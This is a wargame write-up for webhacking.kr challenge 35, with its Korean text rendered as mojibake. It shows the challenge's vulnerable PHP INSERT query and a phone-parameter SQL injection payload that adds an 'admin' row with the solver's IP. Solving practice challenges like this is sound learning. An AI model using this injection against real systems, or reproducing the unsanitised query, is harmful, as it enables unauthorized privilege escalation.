---
title: "[webhacking.kr] 35ë²ˆ ë¬¸ì œ í’€ì´[sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "35ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 35ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152671255-d268cde5-a1e3-454c-bfd2-c0a68537c9d4.png)

  ```php
  <?php
  $db = dbconnect();
  if($_GET['phone'] && $_GET['id']){
    if(preg_match("/\*|\/|=|select|-|#|;/i",$_GET['phone'])) exit("no hack");
    if(strlen($_GET['id']) > 5) exit("no hack");
    if(preg_match("/admin/i",$_GET['id'])) exit("you are not admin");
    mysqli_query($db,"insert into chall35(id,ip,phone) values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',{$_GET['phone']})") or die("query error");
    echo "Done<br>";
  }

  $isAdmin = mysqli_fetch_array(mysqli_query($db,"select ip from chall35 where id='admin' and ip='{$_SERVER['REMOTE_ADDR']}'"));
  if($isAdmin['ip'] == $_SERVER['REMOTE_ADDR']){
    solve(35);
    mysqli_query($db,"delete from chall35");
  }
  ?>
  ```

# ë¬¸ì œ í’€ì´
  >í•„í„°ë§ ë˜ëŠ” ë¬¸ìì—´

  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
  |:--:|:--:|:--:|:--:|:--:|:--:|:--:|
  |  *  |/|=|select|-|#|;|

  >injection í•´ì•¼ í•˜ëŠ” sql êµ¬ë¬¸

  ```sql
insert into chall35(id,ip,phone) values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',{$_GET['phone']})
  ```

  ë¬¸ì œì—ì„œ get ë°©ì‹ìœ¼ë¡œ id, phoneì„ ë°›ì•„ì„œ dbë¡œ ë°”ë¡œ ì…ë ¥ì„ í•©ë‹ˆë‹¤. idëŠ” ê¸¸ì´ê°€ 5ê°€ ë„˜ìœ¼ë©´ ì•ˆë˜ë¯€ë¡œ ì¸ì ì…˜ì„ ì‹œë„í•˜ê¸° ì ì ˆí•˜ì§€ ì•Šê³ , phoneì€ í•„í„°ë§ ë¬¸ìë“¤ë§Œ ìš°íšŒí•˜ë©´ ì¸ì ì…˜ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ìš°ì„  ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒ ì¡°ê±´ì´ ë˜ë©´ í’€ë¦½ë‹ˆë‹¤.
  
  ```php
  $isAdmin = mysqli_fetch_array(mysqli_query($db,"select ip from chall35 where id='admin' and ip='{$_SERVER['REMOTE_ADDR']}'"));
  if($isAdmin['ip'] == $_SERVER['REMOTE_ADDR']){
    solve(35);
  }
  ```

  ì¦‰ DBì— ë‚˜ì˜ IPë¡œ 'admin' ì•„ì´ë””ê°€ ì¡´ì¬í•´ì•¼ í•©ë‹ˆë‹¤.

  ë‹¤ìŒê³¼ ê°™ì´ phoneì— ì¿¼ë¦¬ë¬¸ì„ ì‘ì„±í•˜ë©´ ë©ë‹ˆë‹¤.
  ```python
123),('admin','58.122.121.25',123
  ```

  ê·¸ëŸ¬ë©´ ì„œë²„ìª½ì˜ sql ë¬¸ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì´ sql ë¬¸ì´ ì‘ì„±ë©ë‹ˆë‹¤.

  ```sql
  insert into chall35(id,ip,phone) values ('guest','58.122.121.25',123),('admin','58.122.121.25',123)
  ```

  ![image](https://user-images.githubusercontent.com/33647663/152671686-b78de901-653f-46f5-a03e-eb020c93dcf6.png)